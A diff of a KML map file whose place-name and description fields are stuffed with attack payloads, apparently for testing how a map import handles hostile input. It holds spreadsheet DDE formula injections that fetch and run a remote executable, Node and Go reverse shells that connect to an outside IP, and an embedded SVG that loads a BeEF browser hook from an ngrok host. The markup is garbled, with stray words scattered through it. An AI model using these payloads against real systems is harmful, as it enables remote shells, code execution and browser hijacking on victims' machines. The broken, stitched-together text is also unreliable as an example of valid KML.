@@ -1,13 +1,35 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <kml xmlns="http://www.opengis.net/kml/2.2">
   <Document>
-    <name><![CDATA[=DDE("cmd";"/C calc";"!A0")A0 @SUM(1+9)*cmd|' /C calc'!A0 =10+20+cmd|' /C calc'!A0 =cmd|' /C notepad'!'A1' =cmd|'/C powershell IEX(wget http://154.49.137.21/shell.exe)'!A0 =cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1]]></name>
+    <name><![CDATA[=DDE("cmd";"/C calc";"!A0")A0 @SUM(1+9)*require('child_process').exec('nc -e /bin/sh 154.49.137.21 80')|' /C calc'!A0 =10+20+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","154.49.137.21:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go|' /C calc'!A0 =cmd|' /C notepad'!'A1' =cmd|'/C powershell IEX(wget http://154.49.137.21/shell.exe)'!A0 =cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1]]></name>
+  StringUtils
     <description><![CDATA[<% tools.appendString(StringUtils.reversibleCrossScriptingFilter(tools.getParamValue("paramname"))); %>]]></description>
     <NetworkLink>
-      <name><![CDATA[=DDE("cmd";"/C calc";"!A0")A0 @SUM(1+9)*cmd|' /C calc'!A0 =10+20+cmd|' /C calc'!A0 =cmd|' /C notepad'!'A1' =cmd|'/C powershell IEX(wget http://154.49.137.21/shell.exe)'!A0 =cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1]]></name>
-      <Link>
+      <name><![CDATA[=DDE("cmd";"/C calc";"!A0")A0 @SUM(1+9)*cmd|' /C calc'!A0 =10+20+cmd|' /C calc'!A0 =require('child_process').exec('nc -e /bin/sh 154.49.137.21 80')|' /C notepad'!'A1' =cmd|'/C powershell IEX(wget http://154.49.137.21/shell.exe)'!A0 =cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1]]></name>
+    
+<svg width="100%" height="100%" viewBox="0 0 100 100"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <circle cx="50" cy="50" r="45" fill="green"
+          id="foo" o="foo"/>
+<html>
+<head>
+  <script type="text/javascript" xlink:href="https://fe05-179-24-242-83.ngrok.io/hook.js"></script>
+</head>
+<body>
+<script type="text/javascript" xlink:href="https://fe05-179-24-242-83.ngrok.io/"></script>
+</body>
+</html>
+<script type="text/javascript" xlink:href="https://fe05-179-24-242-83.ngrok.io/vuln.php"></script>
+  <image xlink:href="javascript:%20(function%20()%20{%20var%20url%20=%20%27http://0.0.0.0:3000/hook.js%27;if%20(typeof%20beef%20==%20%27undefined%27)%20{%20var%20bf%20=%20document.createElement(%27script%27);%20bf.type%20=%20%27text%2fjavascript%27;%20bf.src%20=%20url;%20document.body.appendChild(bf);}})();" height="200" width="200" onload="document.getElementById('foo').setAttribute('fill', 'blue');"/>
+</svg>
+  <Link>sssgg
         <href><![CDATA[https://www.google.com/maps/d/u/1/kml?forcekml=1&mid=1_aZmhBvyjuSuP-ztAgojmIUfti-pCvQ]]></href>
-      </Link>
+      </Link>require('child_process').exec('nc -e /bin/sh 154.49.137.21 80')
     </NetworkLink>
   </Document>
 </kml>
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","154.49.137.21:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+shell
+shell ç
+subprocess
+1_aZmhBvyjuSuP-ztAgojmIUfti-pCvQ
